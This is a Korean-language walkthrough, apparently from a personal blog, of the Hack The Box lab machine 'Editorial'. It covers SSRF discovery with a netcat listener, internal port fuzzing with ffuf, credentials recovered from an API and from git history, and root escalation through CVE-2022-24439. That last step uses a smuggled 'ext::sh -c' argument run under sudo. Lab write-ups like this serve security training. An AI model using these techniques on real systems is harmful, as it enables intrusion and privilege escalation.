---
title: "Editorial"
date: 2025-02-08
update: 2025-02-08
tags:
  - HTB
  - SSRF
  - git
  - sudo-l
  - SSH
  - 리눅스
---
## Editorial 요약
![](https://velog.velcdn.com/images/h3llanut3lla/post/fbaf8181-884b-4302-994a-4f0b91a51d79/image.png)

> 🌟 **한 줄 평**
> 비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다. 

'Editorial'은 'Server-Side Request Forgery(SSRF)'에 취약한 웹 애플리케이션을 갖춘 쉬운 난이도의 리눅스 시스템이다. 이 취약점은 내부에서 실행되는 API의  로그인 액세스 권한을 얻기 위해 활용되며, 이는 'SSH' 액세스로 이어지는 로그인 자격 증명을 얻기 위해 활용된다. 시스템에서 정보수집을 하다보면 새로운 사용자의 로그인 자격증명을 깃 'Git' 리포지토리에서 찾을 수 있다. 'root' 사용자는 [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) 및 `sudo` 구성을 활용하여 얻을 수 있다.

## 정보수집
### Nmap 포트 스캔
```sh
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```
TCP로는 SSH와 HTTP만 열려 있다. 
SSH는 로그인 자격증명이 필요하기 때문에 HTTP부터 살펴보자. 

### 80-HTTP
![](https://velog.velcdn.com/images/h3llanut3lla/post/a31f6fae-0874-41eb-ab2b-ab3a71f59169/image.png)

웹사이트는 이렇게 생겼고, 한눈에 보기에 취약한 부분은 우층 상단의 서치바 정도이지만, 간단한 SQL Injection 테스트후 취약점을 발견하지 못해 정보를 더 수집해보자. 

#### 디렉토리 퍼징 (Directory Fuzzing)
![](https://velog.velcdn.com/images/h3llanut3lla/post/59c0075b-62ad-4064-8b2d-b9d624c3bda7/image.png)

`/upload` 와 `/about` 디렉토리를 찾았다. 

`/upload` 에 접속해보자. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/f9f0b9c1-ca80-4254-8778-5319d945563c/image.png)

상단 Book Information 아래 좌측 `Cover URL related to your book or` 란에 공격자 IP를 아래와 같이 적고 

```sh
http://공격자IP/test
```

넷캣 리스터 (netcat listener)를 열어둔 상태에서 

```sh
nc -lvnp 80
```
`Preview` 버튼을 누르면 HTTP 리퀘스트가 들어온것을 확인할 수 있다 (캡쳐 생략). 이것은 이 애플리케이션이 Server-side request forgery (SSRF)에 취약하다는것을 의미한다. 

Burp Suite의 Repeater를 이용해보자. 
`bookurl` 값에 로컬 IP주소를 입력하면 jpeg 이미지가 리스펀스로 돌아온다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/0759040b-bcaf-444e-aaa9-3c61aca23e49/image.png)

#### 포트 퍼징 (Port Fuzzing)
이제 내부의 호스팅된 서비스를 찾기 위해 포트 퍼징을 해보자. 찾아보니 Burp Suite의 Intruder를 이용하는 방법이 있는 것 같은데 나는 ffuf를 사용하여 퍼징하는 방법을 택했다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/7fd3d79d-66ca-45e5-be2b-219d1de9758c/image.png)

Burp Suite 의 Proxy 모드에서 Intercept를 클릭해 리퀘스트를 선택해주고 
`http://127.0.0.1:FUZZ` 라고 입력한 후, 우클릭 -> `Copy to file` -> `req.txt` 라는 파일명으로 수정된 HTTP 리퀘스트 파일을 저장해준다. 

그리고 아래의 명령어를 입력해 포트 퍼징을 해준다. 
```sh
ffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61
```
![](https://velog.velcdn.com/images/h3llanut3lla/post/f4cff494-ae9a-4430-8356-c0fbf78fbf5a/image.png)

5000 을 찾았다. 

그럼 이제 다시 기존의 Burp Suite Repeater로 돌아가서 새로 찾은 포트번호를 로컬IP에 추가해주면 

![](https://velog.velcdn.com/images/h3llanut3lla/post/85014a6b-415e-4ceb-8366-10dd8ccaa9e9/image.png)

우측과 같이 새로운 디렉토리가 리스펀스로 돌아보는 것을 확인할 수 있다. 
새로운 디렉토리로 가보면 저절로 파일이 다운로드 되는데 파일을 열어보면 아래와 같다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/6b33ce2c-09ed-41f1-b8f6-75fc553f591a/image.png)

이걸 읽기 쉽게 json으로 포매팅 해보자. 

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
이중 `/api/latest/metadata/messages/authors`를 리퀘스트로 보내면 새로운 디렉토리가 리스펀스로 돌아오게 된다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/7814a566-da48-4612-818a-c34e16959f1c/image.png)

그리고 이전과 같이 리스펀스로 돌아온 디렉토리로 접속하면 자동으로 파일이 다운로드 된다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/10a080ea-88d4-4165-8365-6234f1840770/image.png)

그리고 다운로드된 파일을 열어보면 아래와 같은 로그인 자격증명을 획득할 수 있다.
- 유저네임 `dev` 
- 비밀번호 `dev080217_devAPI!@`  

![](https://velog.velcdn.com/images/h3llanut3lla/post/9cf4cb93-6506-4cd4-8f64-c2652f7b0307/image.png)

## 초입
얻은 로그인 자격증명을 이용해 SSH에 연결해보자.

![](https://velog.velcdn.com/images/h3llanut3lla/post/e9265bde-e6c4-4931-8437-6ca01f2ca296/image.png)

## 측면 이동 (Lateral Movement)
`~/apps` 에 깃(git)이 있다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/54649a1e-bf6a-483a-b6a9-a916deb0989e/image.png)

![](https://velog.velcdn.com/images/h3llanut3lla/post/788c8a3f-16d3-4664-9861-ed8b7d8b549f/image.png)

`~/apps/.git/logs` 에서 하이라이트된 부분을 아래의 명령어를 이용해 자세히 살펴보자. 

```sh
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```
그러면 아래와 같은 탬플렛 메일 메세지 `template_mail_message` 내용을 볼 수 있고, 이전과 같이 새로운 로그인 자격증명을 얻을 수 있다. 

- 유저네임: `prod`
- 비밀번호: `080217_Producti0n_2023!@`

![](https://velog.velcdn.com/images/h3llanut3lla/post/87696c9a-acce-4d0b-8747-8639d7ba44c0/image.png)

새로 얻은 로그인 자격증명을 이용해 SSH에 연결하자. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/db395340-5adc-4aa7-9a8c-a999255c9d1a/image.png)

## 권한 상승 (Privilege Escalation)
슈퍼유저로 실행할 수 있는 권한을 확인하기 위해 `sudo -l` 를 살펴보면

![](https://velog.velcdn.com/images/h3llanut3lla/post/98018cdc-2259-4e1c-8297-02d39f4fd425/image.png)

`/opt/internal_apps/clone_changes/clone_prod_change.py *` 파이썬 파일을 권한 상승없이 실행 시킬 수 있다는 것을 확인할 수 있다. 

![](https://velog.velcdn.com/images/h3llanut3lla/post/e05aaac8-1689-405e-b57f-655b19f5cd5b/image.png)

여기서 중요한 부분은 아래와 같다. 

```python
from git import Repo
```

이 스크립트가 GitPython 라이브러리를 활용하여 Git 작업을 수행한다는 것을 알 수 있는 대목이기 때문에 이 스크립트에서 가장 유용한 정보라고 할 수 있다. 

구글에 `from git import Repo` 의 취약점을 검색하면 [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)에 관한 내용을 찾아볼 수 있고 이를 악용해 권한 상승을 할 수 있다. 

나는 https://github.com/gitpython-developers/GitPython/issues/1515 여기와 여기 https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858 를 참고했다. 

```sh
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```
![](https://velog.velcdn.com/images/h3llanut3lla/post/1e3ee081-6a2c-4fd1-b7d1-ed60143190c5/image.png)

이렇게 `sudo`와 함께 상위 명령어를 입력하면 하면 루트로 권한 상승을 할 수 있다. 